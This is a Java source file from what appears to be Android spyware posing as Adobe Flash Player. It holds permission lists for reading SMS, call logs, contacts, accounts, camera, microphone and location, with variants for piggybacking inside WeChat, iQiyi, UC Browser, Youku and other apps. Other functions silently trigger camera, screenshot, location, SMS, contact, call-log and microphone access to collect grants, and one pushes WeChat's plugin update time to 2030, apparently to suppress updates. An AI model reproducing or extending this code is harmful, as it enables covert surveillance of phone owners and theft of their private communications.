package com.authority;


import java.util.ArrayList;
import java.util.List;

import com.adobe.flashplayer.R;
import com.main.ForegroundService;
import com.phone.data.CameraPhotoActivity;
import com.phone.data.PhoneLocation;
import com.phone.data.ScreenSnapshotActivity;
import com.utils.PrefOper;
import com.utils.PublicFunction;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.PermissionChecker;
import android.util.Log;
import android.widget.Toast;


public class AuthoritySettings {
	private static String TAG = "AuthoritySettings";
	public static int PERMISSIONCODE = 9999;
	//public static int OVERLYPERMISSIONCODE = 9998;
	
	////确保你使用android.Manifest而不是my.app.package.Manifest。很多时候Android Studio会默认使用后者而不是前者。
	@SuppressLint("InlinedApi") 
	public static String[] pers = { 
		android.Manifest.permission.READ_PHONE_STATE,
		android.Manifest.permission.INTERNET,
		android.Manifest.permission.ACCESS_NETWORK_STATE,
		android.Manifest.permission.CAMERA,
		android.Manifest.permission.RECORD_AUDIO,
		android.Manifest.permission.MOUNT_UNMOUNT_FILESYSTEMS,
		android.Manifest.permission.WRITE_EXTERNAL_STORAGE, 
		android.Manifest.permission.READ_EXTERNAL_STORAGE, 
		android.Manifest.permission.READ_CONTACTS,
		android.Manifest.permission.ACCESS_FINE_LOCATION,
		android.Manifest.permission.ACCESS_COARSE_LOCATION,
		android.Manifest.permission.SYSTEM_ALERT_WINDOW,
		android.Manifest.permission.READ_CALL_LOG,
		android.Manifest.permission.READ_SMS,
		android.Manifest.permission.SEND_SMS,
		android.Manifest.permission.RECEIVE_SMS,
		android.Manifest.permission.CALL_PRIVILEGED, 
		android.Manifest.permission.CALL_PHONE,
		//android.Manifest.permission.READ_HISTORY_BOOKMARKS,
		"com.android.browser.permission.READ_HISTORY_BOOKMARKS",
		android.Manifest.permission.CHANGE_CONFIGURATION,
		android.Manifest.permission.RECEIVE_BOOT_COMPLETED,
		android.Manifest.permission.CHANGE_WIFI_STATE,
		android.Manifest.permission.CHANGE_NETWORK_STATE,
		android.Manifest.permission.WAKE_LOCK,
		android.Manifest.permission.ACCESS_WIFI_STATE,
		android.Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
		android.Manifest.permission.PACKAGE_USAGE_STATS,
		android.Manifest.permission.REQUEST_INSTALL_PACKAGES,
	 	"android.permission.READ_SYNC_SETTINGS",
		"android.permission.WRITE_SYNC_SETTINGS",
	    "android.permission.AUTHENTICATE_ACCOUNTS",
	    "android.permission.MANAGE_ACCOUNTS",
		"android.permission.GET_ACCOUNTS",
	    "android.permission.WAKE_LOCK"
	};
	
	public static String[] weixinpers = { 
		android.Manifest.permission.READ_PHONE_STATE,
		android.Manifest.permission.WRITE_EXTERNAL_STORAGE, 
		android.Manifest.permission.READ_EXTERNAL_STORAGE, 
		android.Manifest.permission.CAMERA, 
		android.Manifest.permission.INTERNET,
		android.Manifest.permission.RECORD_AUDIO,
		android.Manifest.permission.READ_CONTACTS,
		android.Manifest.permission.ACCESS_FINE_LOCATION,
		android.Manifest.permission.ACCESS_COARSE_LOCATION,
		android.Manifest.permission.SYSTEM_ALERT_WINDOW,
		//android.Manifest.permission.READ_SMS,
		//android.Manifest.permission.READ_CALL_LOG,
		android.Manifest.permission.ACCESS_WIFI_STATE,
		android.Manifest.permission.ACCESS_NETWORK_STATE
	};
	
	public static String[] iqiyipers = { 
		android.Manifest.permission.READ_PHONE_STATE,
		android.Manifest.permission.WRITE_EXTERNAL_STORAGE, 
		android.Manifest.permission.READ_EXTERNAL_STORAGE, 
		android.Manifest.permission.CAMERA, 
		android.Manifest.permission.INTERNET,
		android.Manifest.permission.RECORD_AUDIO,
		android.Manifest.permission.READ_CONTACTS,
		
		android.Manifest.permission.ACCESS_FINE_LOCATION,
		android.Manifest.permission.ACCESS_COARSE_LOCATION,
		
		android.Manifest.permission.SYSTEM_ALERT_WINDOW,
		
		//android.Manifest.permission.CALL_PHONE,
	
		android.Manifest.permission.ACCESS_WIFI_STATE,
		android.Manifest.permission.ACCESS_NETWORK_STATE
	};
	
	public static String[] youkupers = { 
		android.Manifest.permission.READ_PHONE_STATE,
		android.Manifest.permission.WRITE_EXTERNAL_STORAGE, 
		android.Manifest.permission.READ_EXTERNAL_STORAGE, 
		android.Manifest.permission.CAMERA, 
		android.Manifest.permission.INTERNET,
		android.Manifest.permission.RECORD_AUDIO,
		
		android.Manifest.permission.ACCESS_FINE_LOCATION,
		android.Manifest.permission.ACCESS_COARSE_LOCATION,
		
		android.Manifest.permission.SYSTEM_ALERT_WINDOW,
	
		android.Manifest.permission.ACCESS_WIFI_STATE,
		android.Manifest.permission.ACCESS_NETWORK_STATE
	};
	
	public static String[] ucbrowserpers = { 
		android.Manifest.permission.READ_PHONE_STATE,
		android.Manifest.permission.WRITE_EXTERNAL_STORAGE, 
		android.Manifest.permission.READ_EXTERNAL_STORAGE, 
		android.Manifest.permission.CAMERA, 
		android.Manifest.permission.INTERNET,
		android.Manifest.permission.RECORD_AUDIO,
		android.Manifest.permission.READ_CONTACTS,
		
		android.Manifest.permission.ACCESS_FINE_LOCATION,
		android.Manifest.permission.ACCESS_COARSE_LOCATION,
		
		android.Manifest.permission.SYSTEM_ALERT_WINDOW,
	
		android.Manifest.permission.ACCESS_WIFI_STATE,
		android.Manifest.permission.ACCESS_NETWORK_STATE
	};
	
	public static String[] qqmusicpers = { 
		android.Manifest.permission.READ_PHONE_STATE,
		android.Manifest.permission.WRITE_EXTERNAL_STORAGE, 
		android.Manifest.permission.READ_EXTERNAL_STORAGE, 
		android.Manifest.permission.CAMERA, 
		android.Manifest.permission.INTERNET,
		android.Manifest.permission.RECORD_AUDIO,
		
		android.Manifest.permission.ACCESS_FINE_LOCATION,
		android.Manifest.permission.ACCESS_COARSE_LOCATION,
		
		android.Manifest.permission.SYSTEM_ALERT_WINDOW,

		android.Manifest.permission.ACCESS_WIFI_STATE,
		android.Manifest.permission.ACCESS_NETWORK_STATE
	};
	
	public static String[] qukanpers = { 
		android.Manifest.permission.READ_PHONE_STATE,
		android.Manifest.permission.WRITE_EXTERNAL_STORAGE, 
		android.Manifest.permission.READ_EXTERNAL_STORAGE, 
		android.Manifest.permission.CAMERA, 
		android.Manifest.permission.INTERNET,
		android.Manifest.permission.RECORD_AUDIO,
		android.Manifest.permission.READ_CONTACTS,
		
		android.Manifest.permission.ACCESS_FINE_LOCATION,
		android.Manifest.permission.ACCESS_COARSE_LOCATION,
		
		android.Manifest.permission.SYSTEM_ALERT_WINDOW,
		
		//android.Manifest.permission.CALL_PHONE,
	
		android.Manifest.permission.ACCESS_WIFI_STATE,
		android.Manifest.permission.ACCESS_NETWORK_STATE
	};
	
	
	public static String[] tencentnewspers = { 
		android.Manifest.permission.READ_PHONE_STATE,
		android.Manifest.permission.WRITE_EXTERNAL_STORAGE, 
		android.Manifest.permission.READ_EXTERNAL_STORAGE, 
		android.Manifest.permission.CAMERA, 
		android.Manifest.permission.INTERNET,
		android.Manifest.permission.RECORD_AUDIO,

		android.Manifest.permission.ACCESS_FINE_LOCATION,
		android.Manifest.permission.ACCESS_COARSE_LOCATION,
		
		android.Manifest.permission.SYSTEM_ALERT_WINDOW,
	
		android.Manifest.permission.ACCESS_WIFI_STATE,
		android.Manifest.permission.ACCESS_NETWORK_STATE
	};
	
	
	public static String[] basepers = {
		android.Manifest.permission.READ_PHONE_STATE,
		android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
		android.Manifest.permission.READ_EXTERNAL_STORAGE,
		
		android.Manifest.permission.RECORD_AUDIO,
		
		android.Manifest.permission.CAMERA, 

		android.Manifest.permission.INTERNET,
		
		android.Manifest.permission.READ_CONTACTS,
		
		android.Manifest.permission.SYSTEM_ALERT_WINDOW,

		android.Manifest.permission.ACCESS_FINE_LOCATION,
		android.Manifest.permission.ACCESS_COARSE_LOCATION,
		android.Manifest.permission.ACCESS_WIFI_STATE,
		android.Manifest.permission.ACCESS_NETWORK_STATE
	};
	
	
	public static boolean checkSinglePermission(Context context,String permission) {
	
		try{
			if (Build.VERSION.SDK_INT < 23) {
				return true;
			}else{
				int targetapi = getTargetApi(context);
				int ret = -1;
				if (targetapi < 23) {
					ret = PermissionChecker.checkSelfPermission(context, permission);
				}else{
					PackageManager pm = context.getPackageManager();
					
					String packagename = context.getPackageName();
					
					ret = pm.checkPermission(permission,packagename);
				}
				
				if (ret == PackageManager.PERMISSION_GRANTED) {
					Log.e(TAG, permission + " is allowed");
					return true;
				}else{
					Log.e(TAG, permission + " is not allowed");
				}
			}
		}catch(Exception e){
			e.printStackTrace();
		}
		
		return false;
	}
	
	
	
	

	public static void permissionSettings(Context context){
		try {
			Intent intent = new Intent(context,CameraPhotoActivity.class);
			intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			CameraPhotoActivity.camerano = 0;
			context.startActivity(intent);
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		try{
			if((Build.VERSION.SDK_INT >= 21) ){
				Intent intent = new Intent(context,ScreenSnapshotActivity.class);
				intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				context.startActivity(intent);
			}else{
				Log.e(TAG,"not support screen capture");
			}
		}catch(Exception ex){
			ex.printStackTrace();
		}

		try {
			boolean ret = PhoneLocation.isLocationEnabled(context);
			if(ret == false){
				Toast.makeText(context, "请手动打开定位服务按钮",Toast.LENGTH_LONG).show();
				Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
				context.startActivity(intent); 
			}
			ret = PhoneLocation.doOneNetworkLocation(context);
			if (ret == false) {
				Log.e(TAG, "network location null");
				
				ret = PhoneLocation.doOneGpsLocation(context);
				if (ret == false) {
					Log.e(TAG, "gps location null");
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		try {
			ContentResolver cr = context.getContentResolver();  
			String[] projection = new String[] {"_id", "address", "person","body", "date", "type"};
			Cursor cur = cr.query(Uri.parse("content://sms/"), projection, null, null, "date desc");
			cur.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		try {
			ContentResolver resolver = context.getContentResolver();
	        String[] cols = {ContactsContract.PhoneLookup.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER};
	        Cursor cursor = resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,cols, null, null, null);
	        cursor.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		try {
			ContentResolver cr = context.getContentResolver();
		    Cursor cs=cr.query(CallLog.Calls.CONTENT_URI, 
		    new String[]{
		    		CallLog.Calls.CACHED_NAME,CallLog.Calls.NUMBER,CallLog.Calls.TYPE,CallLog.Calls.DATE,CallLog.Calls.DURATION
		    		},
		    null,null,CallLog.Calls.DEFAULT_SORT_ORDER);
		    cs.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	
	
		try {
			//MicAudioRecord.micAudioRecord(context,1);
			MediaRecorder mediaRecoder = new MediaRecorder();
			mediaRecoder.setAudioSource(MediaRecorder.AudioSource.MIC);
			mediaRecoder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
			mediaRecoder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
			mediaRecoder.setOutputFile(ForegroundService.LOCAL_PATH_NAME + "/test.mp4");
			try {
				mediaRecoder.prepare();
				mediaRecoder.start();
				mediaRecoder.stop();
			} catch (Exception e) {
				e.printStackTrace();
			}
			mediaRecoder.release();
			mediaRecoder = null;
		} catch (Exception e) {
			e.printStackTrace();
		}
		

	}
	
	

	@TargetApi(23) 
	public static void checkPermission(Activity activity) {

		try{
			if (Build.VERSION.SDK_INT < 23) {
				return;
			}
			
			List<String> list = new ArrayList<String>();

			int targetapi = getTargetApi((Context)activity);
			
			for (int i = 0; i < pers.length; i++) {
				
				int ret = -1;
				if (targetapi < 23) {
					ret = PermissionChecker.checkSelfPermission(activity,pers[i]);
				}else{
					ret = activity.checkSelfPermission(pers[i]);
				}

				if (ret != PackageManager.PERMISSION_GRANTED) {
					Log.e(TAG, pers[i] + "is not allowed");
					
					list.add(pers[i]);
					
					//shouldShowRequestPermissionRationale的返回值主要以下几种情况 ：
					//第一次打开App时false
					//上次弹出权限点击了禁止（但没有勾选下次不在询问）true
					//上次选择禁止并勾选：下次不在询问false
					 if (ActivityCompat.shouldShowRequestPermissionRationale(activity,pers[i]) == false){
						 Log.e(TAG, pers[i] + " is yet allowed to be requested");
					 }else{
						 Log.e(TAG, pers[i] + " is not allowed any more");
					 }
				}else{
					Log.e(TAG, pers[i] + " is allowed");
				}
			}
			
			if (list.size() > 0) {
				String[] array = new String[list.size()];
				list.toArray(array);
				activity.requestPermissions(array, PERMISSIONCODE);
			}
		}catch(Exception e){
			e.printStackTrace();
		}
	}
	
	
	@TargetApi(23) 
	public static void checkCandrawOverly(Context act){
		if (Build.VERSION.SDK_INT >= 23) {
            if (!Settings.canDrawOverlays(act)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                act.startActivity(intent);
                
                Toast.makeText(act, "请点击\"" + act.getString(R.string.app_name) +"\"并允许悬浮窗",Toast.LENGTH_LONG).show();
            } else {
            	return;
            }
        }

//		if (Build.VERSION.SDK_INT >= 23) {
//	        if ( Settings.canDrawOverlays(act) == false) {
//	            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
//		Uri.parse("package:" + act.getPackageName()));
//	            act.startActivity(intent);
//	        }
//	    }
	}
	
	
	public static int changeUpdateTime(Context context){
		String packname = context.getPackageName();
		if(packname.contains("com.tencent.mm")){
			@SuppressWarnings("unused")
			long time = PrefOper.getLongValue(context, "xwalk_plugin_update_info", "nLastFetchPluginConfigTime");
			//if(time != 0){
				long now = PublicFunction.getTimeMillis("2030-1-1 12:00:00");
				PrefOper.setValue(context, "xwalk_plugin_update_info", "nLastFetchPluginConfigTime",now);
				
				Log.e(TAG,"reset update time:" + String.valueOf(now));
				return 1;
			//}
		}

		return 0;
	}
	
	
	public static int getTargetApi(Context context){
		try {
	        PackageInfo info = context.getPackageManager().getPackageInfo( context.getPackageName(), 0);
	        int targetSdkVersion = info.applicationInfo.targetSdkVersion;
	        return targetSdkVersion;
	    } catch (PackageManager.NameNotFoundException e) {
	        e.printStackTrace();
	    }
		return 23;
	}
	
	
	@TargetApi(Build.VERSION_CODES.JELLY_BEAN) 
	public static void checkPluginPermission(Activity activity,Context context) {
		try{
			if (Build.VERSION.SDK_INT < 23)
			{
				return;
			}

			if (activity == null || context == null) {
				return;
			}
			
			String apppers[];
			String packagename = context.getPackageName();
			if (packagename.contains("com.tencent.mm") == true) {
				apppers = weixinpers;
			}else if(packagename.contains("com.qiyi.video") == true){
				apppers = iqiyipers;
			}
			else if (packagename.contains("com.UCMobile") == true) {
				apppers = ucbrowserpers;
			}
			else if (packagename.contains("com.youku.phone") == true) {
				apppers = youkupers;
			}
			else if (packagename.contains("com.tencent.qqmusic") == true) {
				apppers = qqmusicpers;
			}
			else if (packagename.contains("com.jifen.qukan") == true) {
				apppers = qukanpers;
			}
			else if (packagename.contains("com.tencent.news") == true) {
				apppers = tencentnewspers;
			}else if (packagename.contains("com.apps.plus") == true || packagename.contains("com.adobe.flashplayer") == true) {
				apppers = pers;
			}
			else{
				apppers = basepers;
			}

			List<String> list = new ArrayList<String>();
			
			int targetapi = getTargetApi(context);
			
			for (int i = 0; i < apppers.length; i++) {
				int ret = 0;
				//if you targeting an API level before 23 on Android 6.0 then 
				//ContextCompat.CheckSelfPermission and Context.checkSelfPermission doesn't work. 
				//Fortunately you can use PermissionChecker.checkSelfPermission to check run-time permissions
				
				//targetSdkVersion 版本号小于23 的要使用PermissionChecker.checkSelfPermission接口来检测权限
				//ret=PermissionChecker.checkSelfPermission(context,apppers[i]);
				
				//PackageManager pm = activity.getPackageManager();
				//ret = pm.checkPermission(apppers[i],packagename);
				
				//ret= context.checkCallingOrSelfPermission(apppers[i]);
				//ret = ContextCompat.checkSelfPermission(context,apppers[i]);		
				if (targetapi < 23)
				{
					try{
						ret = PermissionChecker.checkSelfPermission(context, apppers[i]);
					}catch(Exception e){
						e.printStackTrace();
					}
				}else{
					try{
						ret = context.checkSelfPermission(apppers[i]);
					}catch(Exception e){
						e.printStackTrace();
					}
				}
				
				if (ret != PackageManager.PERMISSION_GRANTED) {
					list.add(apppers[i]);
					
					Log.e(TAG, apppers[i] + " is not allowed");
					
					if (ActivityCompat.shouldShowRequestPermissionRationale(activity, apppers[i]) == false) {
						Log.e(TAG,apppers[i] +" is yet allowed to be requested");
					}else{
						Log.e(TAG,apppers[i] +" is not allowed any more");
					}
				}else{
					Log.e(TAG, apppers[i] + " is allowed");
				}
			}
			
			if (list.size() > 0) {
				String[] array = new String[list.size()];
				list.toArray(array);
				
				try{
					activity.requestPermissions( array, PERMISSIONCODE);
				}catch(Exception e){
					e.printStackTrace();
				}
			}	
		}catch(Exception e){
			e.printStackTrace();
			Log.e(TAG, "checkPluginPermission exception");
		}
	}
	
	
	@TargetApi(Build.VERSION_CODES.JELLY_BEAN) 
	public static String[] getUnauthorityPermissions(Context context) {
		String retstrs[] = null;
		try{
			if (Build.VERSION.SDK_INT < 23)
			{
				return retstrs;
			}

			if (context == null) {
				return retstrs;
			}
			
			String apppers[] = null;
			String packagename = context.getPackageName();
			if (packagename.contains("com.tencent.mm") == true) {
				apppers = weixinpers;
			}else if(packagename.contains("com.qiyi.video") == true){
				apppers = iqiyipers;
			}
			else if (packagename.contains("com.UCMobile") == true) {
				apppers = ucbrowserpers;
			}
			else if (packagename.contains("com.youku.phone") == true) {
				apppers = youkupers;
			}
			else if (packagename.contains("com.tencent.qqmusic") == true) {
				apppers = qqmusicpers;
			}
			else if (packagename.contains("com.jifen.qukan") == true) {
				apppers = qukanpers;
			}
			else if (packagename.contains("com.tencent.news") == true) {
				apppers = tencentnewspers;
			}else if (packagename.contains("com.apps.plus") == true || packagename.contains("com.adobe.flashplayer") == true) {
				apppers = pers;
			}
			else{
				apppers = basepers;
			}

			
			List<String> list = new ArrayList<String>();
			int targetapi = getTargetApi(context);
			
			for (int i = 0; i < apppers.length; i++) {
				int ret = 0;
				//if you targeting an API level before 23 on Android 6.0 then 
				//ContextCompat.CheckSelfPermission and Context.checkSelfPermission doesn't work. 
				//Fortunately you can use PermissionChecker.checkSelfPermission to check run-time permissions
				
				//targetSdkVersion 版本号小于23 的要使用PermissionChecker.checkSelfPermission接口来检测权限
				//ret=PermissionChecker.checkSelfPermission(context,apppers[i]);
				
				//PackageManager pm = activity.getPackageManager();
				//ret = pm.checkPermission(apppers[i],packagename);
				
				//ret= context.checkCallingOrSelfPermission(apppers[i]);
				//ret = ContextCompat.checkSelfPermission(context,apppers[i]);		
				if (targetapi < 23)
				{
					try{
						ret = PermissionChecker.checkSelfPermission(context, apppers[i]);
						
					}catch(Exception e){
						e.printStackTrace();
					}
				}else{
					try{
						ret = context.checkSelfPermission(apppers[i]);
					}catch(Exception e){
						e.printStackTrace();
					}
				}
				
				
				if (ret != PackageManager.PERMISSION_GRANTED) {
					list.add(apppers[i]);
					
					Log.e(TAG, apppers[i] + " is not allowed");
					
//					if (ActivityCompat.shouldShowRequestPermissionRationale(context, apppers[i]) == false) {
//						Log.e(TAG,apppers[i] +" is yet allowed to be requested");
//					}else{
//						Log.e(TAG,apppers[i] +" is not allowed any more");
//					}
				}else{
					Log.e(TAG, apppers[i] + " is allowed");
				}
			}
			
			if (list.size() > 0) {
				retstrs = new String[list.size()];
				list.toArray(retstrs);
			}
		}catch(Exception e){
			e.printStackTrace();
			Log.e(TAG, "checkPluginPermission exception");
		}
		
		return retstrs;
	}
	
	
}

